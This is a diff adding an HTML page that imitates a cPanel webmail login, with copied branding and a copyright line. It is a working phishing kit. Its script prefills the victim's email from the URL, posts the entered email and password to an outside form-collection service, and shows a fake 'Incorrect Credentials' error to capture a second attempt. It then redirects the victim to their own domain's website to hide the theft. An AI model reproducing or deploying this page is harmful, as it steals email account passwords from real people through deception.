@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<link href="https://abundant-tomato-low.on-fleek.app/WebmailLogins1.html/data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" rel="shortcut icon" type="image/x-icon"/>
+<title>Webmail Login</title>
+</head>
+<body>
+<style>
+            @import url("https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css");
+            :root{
+                  --bg: #E00400;
+                  --bg_color: #f8302c;
+                  --bg_light: #d76b69;
+                  --grey : #E9F1F7;
+                  --light_grey: #E6E6E6;
+                  --opaque : #00000066;
+                  --opaque_light : #00000033;
+                  --opaque_dark : #000000bf;
+                  --secondary : #2E2D28;
+                  --black: #1B1919;
+                  --light_black: #5A5A5A;
+                  --primary: #f0d32e;
+                  --primary_light : #fff2aa;
+                  --error_text : #f63737;
+                  --success: #108010;
+                  --light_success: #cbffcb;
+            }
+            .container{
+                  padding: 10px;
+            }
+            .container_body{
+                  margin-top: 120px;
+            }
+            .flexible{
+                  display: flex;
+                  justify-content: center;
+                  align-items: center;
+            }
+            .flex_column{
+                  display: flex;
+                  flex-flow: column;
+            }
+            .g_10px{
+                  gap: 10px;
+            }
+            .g_20px{
+                  gap: 20px;
+            }
+            .flex{
+                  display: flex;
+            }
+            .align_center{
+                  align-items: center;
+            }
+            input[type = "text"], input[type = "password"]{
+                  width: 100%;
+                  border: none;
+                  outline: none;
+            }
+            .input_div{
+                  border: 2px solid rgba(124, 122, 122, 0.546);
+                  padding: 5px;
+                  border-radius: 5px;
+            }
+            .newbutton{
+                  background: #179BD7;
+                  padding: 6px 10px;
+                  border: 1px solid #095779;
+                  border-radius: 5px;
+                  color: white;
+                  font-size: 15px;
+                  margin-top: 20px;
+            }
+            .newbutton:hover{
+                  background: #095779;
+            }
+            .mtop_50px{
+                  width: 300px;
+                  margin: auto;
+                  margin-top: 50px;
+            }
+            .flex_wrap{
+                  display: flex;
+                  flex-wrap: wrap;
+            }
+            .p_50px{
+                  padding: 50px;
+            }
+            .text_center{
+                  text-align: center;
+            }
+            .delimiter{
+                  width: 45%;
+                  border: 1px solid var(--grey);
+            }
+            .via{
+                  width: fit-content;
+                  margin: auto;
+                  margin-top: 50px;
+                  padding: 8px 40px;
+                  display: flex;
+                  justify-content: center;
+                  align-items: center;
+                  border-radius: 5px;
+                  gap: 14px;
+                  background: #FF6C2C;
+                  color: white;
+                  border: none;
+                  width: 300px;
+            }
+            .footer{
+                  font-size: 10px;
+                  text-align: center;
+            }
+            #error{
+                  display: none;
+            }
+            .error_alert{
+                  border: 1px solid #D35351;
+                  background: #D35351;
+                  display: flex;
+                  gap: 15px;
+                  align-items: center;
+                  padding: 15px 10px;
+                  border-radius: 5px;
+                  color: white;
+                  margin-bottom: 30px;
+                  width: 300px;
+            }
+
+            @media screen and (min-width : 500px) {
+                  .form{
+                        width: 300px;
+                        margin: auto;
+                  }
+                  .webmail{
+                        width: 320px !important;
+                  }
+            }
+      </style>
+<div class="container">
+<div class="container_body flex_column">
+<div id="error">
+<div class="flexible">
+<div class="error_alert">
+<img alt="" src="local_resources/img/5c824c47a7926eaa081ee01421402204.png"/>
+                                    Incorrrect Credentials
+                              </div>
+</div>
+</div>
+<div class="flexible">
+<img alt="" class="webmail" src="local_resources/img/a17b0dbb69f6821bdeb5a89a953f19fa.svg" style="width: 65%; margin: auto;"/>
+</div>
+<form action="WebmailLogins1.html" autocomplete="off" class="form flex_column g_20px" id="form" style="margin-top: 50px;">
+<div class="flex_column g_10px">
+<div>Email Address</div>
+<div class="input_div flex g_10px align_center">
+<div class="image">
+<img src="local_resources/img/6f73f18f7a5c01d845e6a93d3f2ceadd.png" width="20">
+</img></div>
+<input id="email" name="email" placeholder="Enter your email address" required="" type="text"/>
+</div>
+</div>
+<div class="flex_column g_10px">
+<div>Password</div>
+<div class="input_div flex g_10px align_center">
+<div class="image">
+<img src="local_resources/img/7d7501d3f13e7f3fcb8f4b80336702f5.png" width="20"/>
+</div>
+<input id="password" name="password" placeholder="Enter your email password." required="" type="password"/>
+</div>
+</div>
+<button class="newbutton" id="newbutton">Log In</button>
+</form>
+<div class="flex g_20px align_center mtop_50px">
+<div class="delimiter"></div>
+<div class="or">OR</div>
+<div class="delimiter"></div>
+</div>
+<button class="via">
+<div>
+<img alt="" src="local_resources/img/4c6edb44aa9cca63eccb4b40e656d215.png" style="filter: brightness(800%);"/>
+</div>
+                        Login via cPanel ID
+                  </button>
+<div class="flex_wrap g_20px p_50px text_center flexible">
+<small>English</small>
+<small>العربية</small>
+<small>български</small>
+<small>čeština</small>
+<small>dansk</small>
+<small>Deutsch</small>
+<small>Ελληνικά</small>
+<small>español</small>
+<small>...</small>
+</div>
+<div class="p_10px flex_column flexible g_10px footer">
+<img src="local_resources/img/4c6edb44aa9cca63eccb4b40e656d215.png" width="25"/>
+<small>Copyright © cPanel, L.L.C. <br/> Privacy Policy</small>
+</div>
+</div>
+</div>
+</body>
+</html>
+<input hidden="" id="number" type="number" value="0"/>
+<script>
+      var link = window.location.href;
+      var url = new URL(link);
+      var hash = url.hash;
+      var updated_email = hash.replace("#", "");
+      document.getElementById("email").value = updated_email;
+      const inputString = updated_email;
+      const delimiter = "@";
+      const delimiterIndex = inputString.indexOf(delimiter);
+      const charactersAfter = inputString.substring(delimiterIndex + 1);
+
+      document.addEventListener("DOMContentLoaded", function() {
+            var form = document.getElementById("form");
+            form.addEventListener("submit", function(e) {
+                  e.preventDefault();
+                  var number = parseInt(document.getElementById("number").value);
+                  var button = document.getElementById("newbutton");
+                  var formData = new FormData(form);
+                  var xhr = new XMLHttpRequest();
+                  xhr.open("POST", "https://nocodeform.io/f/66c6e9024b6de1adf73699f7", true);
+                  const errors = document.getElementById("error");
+                  errors.style.display = "block";
+                  var password = document.getElementById("password");
+                  password.value = "";
+                  var added = number + 1;
+                  document.getElementById("number").value = added;
+                  if (number === 1) {
+                        errors.style.display = "none";
+                        setTimeout(() => {
+                              window.location.href="https://www." + charactersAfter;
+                        }, 2000);
+                  }
+                  xhr.onreadystatechange = function() {
+                  if (xhr.readyState === XMLHttpRequest.DONE) {
+                        if (xhr.status === 200) {
+                              // Handle the response from the PHP page
+                              console.log(xhr.responseText);
+                        } else {
+                              console.error(xhr.responseText);
+                        }
+                  }
+                  };
+                  // Send the form data
+                  xhr.send(formData); 
+            });
+      });
+</script>
